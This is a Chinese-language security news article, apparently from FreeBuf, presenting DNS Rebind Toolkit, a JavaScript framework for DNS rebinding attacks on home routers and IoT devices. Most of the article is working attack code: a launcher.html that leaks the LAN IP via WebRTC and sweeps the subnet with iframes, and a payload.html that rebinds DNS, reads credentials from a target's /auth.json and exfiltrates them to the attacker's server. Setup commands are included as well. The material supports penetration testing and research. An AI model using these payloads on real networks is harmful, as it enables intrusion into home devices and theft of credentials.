@@ -1,0 +1,492 @@
+**注意：本软件仅适用于教育目的，请不要将其用于非法活动，工具作者和本站对用户个人行为不负任何责任。  
+**
+
+ **今天给大家介绍的是一款名叫DNS Rebind
+Toolkit的工具包，这是一款前段JavaScript工具包，渗透测试人员可利用该工具来创建DNS重绑定攻击。**
+
+![](https://image.3001.net/images/20180712/15313561986624.png!small)
+
+##  工具介绍
+
+DNSRebind Toolkit是一款前端JavaScript框架，可用于对存在漏洞的主机或本地局域网服务进行DNS重绑定攻击，类似的服务包括Google
+Home、Roku、SonosWiFi扬声器、WiFi路由器、智能恒温器以及其他的物联网设备。在这款工具的帮助下，远程攻击者可绕过路由器的防火墙，然后直接与目标用户家庭网络内的设备进行交互，并提取出隐私信息，在某些情况下他们甚至还可以直接控制目标设备。
+
+值得一提的是，渗透测试人员可利用该工具包创建自己的DNS重绑定攻击，该工具包在payloads/目录下提供了多种可用于现实攻击的Payload。
+
+##  工具安装
+
+克隆项目源码：
+
+    
+    
+    git clone <https://github.com/brannondorsey/dns-rebind-toolkit.git>
+    
+    cd dns-rebind-toolkit
+
+安装依赖组件
+
+    
+    
+    npm install
+
+运行服务器：
+
+    
+    
+    sudo node server
+
+##  API及工具使用
+
+该工具包提供了两种JavaScript对象，可用于配合创建DNS重绑定攻击：
+
+> 1\. [DNSRebindAttack](https://github.com/brannondorsey/dns-rebind-> toolkit/blob/master/share/js/DNSRebindAttack.js)：这个对象可以用来对包含漏洞的服务器进行攻击。它可以创建、管理并于多个DNSRebindNode对象进行通信，DNSRebindAttack所生成的每一个Payload都必须包含一个DNSRebindNode对象。
+>
+> 2\. [DNSRebindNode](https://github.com/brannondorsey/dns-rebind-> toolkit/blob/master/share/js/DNSRebindNode.js)：这个静态类对象需要包含在每一个HTML
+> Payload文件中，它可以对目标主机所运行的服务进行攻击，并与相应的DNSRebindAttack对象进行通信。
+
+在对有防火墙保护的LAN主机进行攻击时，这两个脚本需要配合使用，基本的攻击过程如下：
+
+> 1\.
+> 攻击者向目标用户发送一条指向恶意HTML页面的链接地址，并执行攻击。例如<http://example.com/launcher.html>，其中launcher.html包含了一个DNSRebindAttack实例。
+>
+> 2\.
+> 目标用户点击了恶意链接，并访问了恶意页面，其中<http://example.com/launcher.html>嵌入在一个iframe里面，页面此时便会触发攻击执行。
+>
+> 3\.
+> DNSRebindAttack此时会搜索目标设备的本地IP地址（例如192.168.10.84），并根据这个IP地址来确定目标网络的IP地址范围（例如192.168.10.0-255）。
+>
+> 4\. launcher.html负责对目标子网的IP地址范围发动DNS重绑定攻击。
+>
+> 5\.
+> DNSRebindAttack会在launcher.html页面中嵌入一个包含了payload.html的iframe，每一个iframe中都包含一个DNSRebindNode对象，用于对IP地址范围内的每一台主机（端口8008）进行攻击。
+
+##  使用样例
+
+一次攻击需要三个脚本和文件协同合作：
+
+> 1\. 一个HTML文件，其中包含DNSRebindAttack实例（例如launcher.html）。
+>
+> 2\.
+> 一个HTML文件，其中包含攻击Payload（例如payload.html），该文件需要通过DNSRebindAttack并根据目标IP地址嵌入到launcher.html中。
+>
+> 3\. 一台DNS Rebind Toolkit服务器（server.js），用于传递文件并提取数据。
+
+###  launcher.html
+
+下面给出的是一个launcher.html文件样本，你可以在项目目录的examples/launcher.html中找到完整代码：
+
+    
+    
+    <!DOCTYPEhtml>
+    
+        <head>
+    
+               <title>Examplelauncher</title>
+    
+        </head>
+    
+        <body>
+    
+            <!-- This script is a depency ofDNSRebindAttack.js and must be included -->
+    
+            <script type="text/javascript"src="/share/js/EventEmitter.js"></script>
+    
+            <!-- Include the DNS Rebind Attackobject -->
+    
+            <script type="text/javascript"src="/share/js/DNSRebindAttack.js"></script>
+    
+            <scripttype="text/javascript">
+    
+            // DNSRebindAttack has a static method thatuses WebRTC to leak the
+    
+            // browser's IP address on the LAN. We'lluse this to guess the LAN's IP
+    
+            // subnet. If the local IP is 192.168.1.89,we'll launch 255 iframes
+    
+            // targetting all IP addresses from192.168.1.1-255
+    
+            DNSRebindAttack.getLocalIPAddress()
+    
+            .then(ip => launchRebindAttack(ip))
+    
+            .catch(err => {
+    
+                console.error(err)
+    
+                // Looks like our nifty WebRTC leaktrick didn't work (doesn't work
+    
+                // in some browsers). No biggie, mosthome networks are 192.168.1.1/24
+    
+                launchRebindAttack('192.168.1.1')
+    
+            })
+    
+            function launchRebindAttack(localIp) {
+    
+                // convert 192.168.1.1 into array from192.168.1.0 - 192.168.1.255
+    
+                const first3Octets =localIp.substring(0, localIp.lastIndexOf('.'))
+    
+                const ips =[...Array(256).keys()].map(octet => `${first3Octets}.${octet}`)
+    
+                // The first argument is the domainname of a publicly accessible
+    
+                // whonow server(<https://github.com/brannondorsey/whonow>).
+    
+                // I've got one running on port 53 ofrebind.network you can to use.
+    
+                // The services you are attacking mightnot be running on port 80 so
+    
+                // you will probably want to changethat too.
+    
+                const rebind = newDNSRebindAttack('rebind.network', 80)
+    
+                // Launch a DNS Rebind attack, spawning255 iframes attacking the service
+    
+                // on each host of the subnet (or so wehope).
+    
+                // Arguments are:
+    
+                // 1) target ip addresses
+    
+                // 2) IP address your Node server.js is running on. Usually 127.0.0.1
+    
+                //    during dev, but then the publicly accessible IP (not hostname)
+    
+                //    of the VPS hosting this repo in production.
+    
+                // 3) the HTML payload to deliver to this service. This HTML file should
+    
+                //    have a DNSRebindNode instance implemented on in it.
+    
+                // 4) the interval in milliseconds to wait between each new iframe
+    
+                //    embed. Spawning 100 iframes at the same time can choke (or crash)
+    
+                //    a browser. The higher this value, the longer the attack takes,
+    
+                //    but the less resources it consumes.
+    
+                rebind.attack(ips, '127.0.0.1','examples/payload.html', 200)
+    
+                // rebind.nodes is also anEventEmitter, only this one is fired using
+    
+                // DNSRebindNode.emit(...). This allowsDNSRebindNodes inside of
+    
+                // iframes to post messages back to theparent DNSRebindAttack that
+    
+                // launched them. You can definecustome events by simply emitting
+    
+                //DNSRebindNode.emit('my-custom-event') and a listener in rebind.nodes
+    
+                // can receive it. That said, there area few standard event names that
+    
+                // get triggered automagically:
+    
+                // - begin: triggered when DNSRebindNode.js is loaded. This signifies
+    
+                //   that an attack has been launched (or at least, it's payload was
+    
+                //   delivered) against an IP address.
+    
+                // - rebind: the DNS rebind was successful, this node should now be
+    
+                //   communicating with the target service.
+    
+                // - exfiltrate: send JSON data back to your Node server.js and save
+    
+                //   it inside the data/ folder.
+    
+                // Additionally, theDNSRebindNode.destroy() static method
+    
+                // will trigger the 'destory' event andcause DNSRebindAttack to
+    
+                // remove the iframe.
+    
+                rebind.nodes.on('begin', (ip) => {
+    
+                    // the DNSRebindNode has beenloaded, attacking ip
+    
+                })
+    
+                rebind.nodes.on('rebind', (ip) => {
+    
+                    // the rebind was successful
+    
+                    console.log('node rebind', ip)
+    
+                })
+    
+                rebind.nodes.on('exfiltrate', (ip,data) => {
+    
+                    // JSON data was exfiltrated andsaved to the data/
+    
+                    // folder on the remote machinehosting server.js
+    
+                    console.log('node exfiltrate', ip,data)
+    
+                    // data = {
+    
+                    //     "username":"crashOverride",
+    
+                    //     "password":"hacktheplanet!",
+    
+                    // }
+    
+                })
+    
+            }
+    
+            </script>
+    
+        </body>
+    
+        </html>
+
+###  payload.html
+
+下面给出的是一个payload.html文件样本，你可以在项目目录的examples/ payload.html中找到完整代码：
+
+    
+    
+    <!DOCTYPEhtml>
+    
+        <html>
+    
+        <head>
+    
+            <title>Example Payload</title>
+    
+        </head>
+    
+        <body>
+    
+        <!--    
+        Loadthe DNSRebindNode. This static class is used to launch the rebind
+    
+        attackand communicate with the DNSRebindAttack instance in example-launcher.html
+    
+        -->
+    
+        <scripttype="text/javascript"src="/share/js/DNSRebindNode.js"></script>
+    
+        <scripttype="text/javascript">
+    
+            attack()
+    
+            .then(() => {},
+    
+                  err => {
+    
+                      // there was an error at somepoint during the attack
+    
+                      console.error(err)
+    
+                      DNSRebindNode.emit('fatal', err.message)
+    
+                  }
+    
+            ) // remove this iframe by callingdestroy()
+    
+            .then(() => DNSRebindNode.destroy())
+    
+            // launches the attack and returns apromise that is resolved if the target
+    
+            // service is found and correctlyexploited, or more likely, rejected because
+    
+            // this host doesn't exist, the targetservice isn't running, or something
+    
+            // went wrong with the exploit. Rememberthat this attack is being launched
+    
+            // against 255+ IP addresses, so most ofthem won't succeed.
+    
+            async function attack() {
+    
+                // DNSRebindNode has some default fetchoptions that specify things
+    
+                // like no caching, etc. You can re-usethem for convenience, or ignore
+    
+                // them and create your own options objectfor each fetch() request.
+    
+                // Here are their default values:
+    
+                // {
+    
+                //    method: "GET",
+    
+                //    headers: {
+    
+                //         // this doesn't work in all browsers.For instance,
+    
+               //         // Firefox doesn't letyou do this.
+    
+                //         "Origin": "", //unset the origin header
+    
+                //         "Pragma":"no-cache",
+    
+                //         "Cache-Control":"no-cache"
+    
+                //    },
+    
+                //    cache: "no-cache"
+    
+                // }
+    
+                const getOptions =DNSRebindNode.fetchOptions()
+    
+                try {
+    
+                    // In this example, we'll pretendwe are attacking some service with
+    
+                    // an /auth.json file withusername/password sitting in plaintext.
+    
+                    // Before we swipe those creds, weneed to first perform the rebind
+    
+                    // attack. Most likely, ourwebserver will cache the DNS results
+    
+                    // for this page's host.DNSRebindNode.rebind(...) recursively
+    
+                    // re-attempts to rebind the hostwith a new, target IP address.
+    
+                    // This can take over a minute, andif it is unsuccessful the
+    
+                    // promise is rejected.
+    
+                    const opts = {
+    
+                        // these options get passed tothe DNS rebind fetch request
+    
+                        fetchOptions: getOptions,
+    
+                        // by default,DNSRebindNode.rebind() is considered successful
+    
+                        // if it receives an HTTP 200OK response from the target service.
+    
+                        // However, you can define anykind of "rebind success" scenario
+    
+                        // yourself with thesuccessPredicate(...) function. This
+    
+                        // function receives a fetchresult as a parameter and the return
+    
+                        // value determines if therebind was successful (i.e. you are
+    
+                        // communicating with thetarget server). Here we check to see
+    
+                        // if the fetchResult was sentby our example vulnerable server.
+    
+                        successPredicate: (fetchResult)=> {
+    
+                            return fetchResult.headers.get('Server')== 'Example Vulnerable Server v1.0'
+    
+                        }
+    
+                    }
+    
+                    // await the rebind. Can take up toover a minute depending on the
+    
+                    // victim's DNS cache settings orif there is no host listening on
+    
+                    // the other side.
+    
+                    awaitDNSRebindNode.rebind(`http://${location.host}/auth.json`, opts)
+    
+                } catch (err) {
+    
+                    // whoops, the rebind failed.Either the browser's DNS cache was
+    
+                    // never cleared, or more likely,this service isn't running on the
+    
+                    // target host. Oh well... Bubbleup the rejection and have our
+    
+                    // attack()'s rejection handlerdeal w/ it.
+    
+                    return Promise.reject(err)
+    
+                }
+    
+                try {
+    
+                    // alrighty, now that we've reboundthe host and are communicating
+    
+                    // with the target service, let'sgrab the credentials
+    
+                    const creds = awaitfetch(`http://${location.host}/auth.json`)
+    
+                                        .then(res =>res.json())
+    
+                     // {
+    
+                     //     "username":"crashOverride",
+    
+                     //     "password":"hacktheplanet!",
+    
+                     // }
+    
+                    // console.log(creds)
+    
+                    // great, now let's exfiltratethose creds to the Node.js server
+    
+                    // running this whole shebang. That's thelast thing we care about,
+    
+                    // so we will just return thispromise as the result of attack()
+    
+                    // and let its handler's deal withit.
+    
+                    //
+    
+                    // NOTE: the second argument toexfiltrate(...) must be JSON
+    
+                    // serializable.
+    
+                    returnDNSRebindNode.exfiltrate('auth-example', creds)
+    
+                } catch (err) {
+    
+                    return Promise.reject(err)
+    
+                }
+    
+            }
+    
+        </script>
+    
+        </body>
+    
+        </html>
+
+###  server.js
+
+这个脚本用来传递launcher.html和payload.html文件，并负责接收和保存工具从目标主机中提取出的数据：
+
+    
+    
+    usage:server [-h] [-v] [-p PORT]
+    
+        DNSRebind Toolkit server
+    
+        Optionalarguments:
+    
+          -h, --help            Show this help message and exit.
+    
+          -v, --version         Show program's version number andexit.
+    
+          -p PORT, --port PORT  Which ports to bind the servers on. Mayinclude
+    
+                                multiple like: --port80 --port 1337 (default: -p 80
+    
+                                -p 8008 -p 8060 -p1337)
+
+##  项目结构
+
+> 1\. server.js：DNS Rebind Toolkit服务器；
+>
+> 2\. payloads/：包含了多种可直接使用的HTML Payload文件，可用于针对存在漏洞的物联网设备进行渗透测试；
+>
+> 3\. examples/：使用样例文件；
+>
+> 4\. data/：提取出的数据信息将保存在该目录下（方法：DNSRebindNode.exfiltrate(...)）；
+>
+> 5\. share/：存储了examples/和payload/目录中HTML文件共享的JavaScript文件；
+
+ *** 参考来源：[brannondorsey](https://github.com/brannondorsey/dns-rebind-toolkit)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**
+
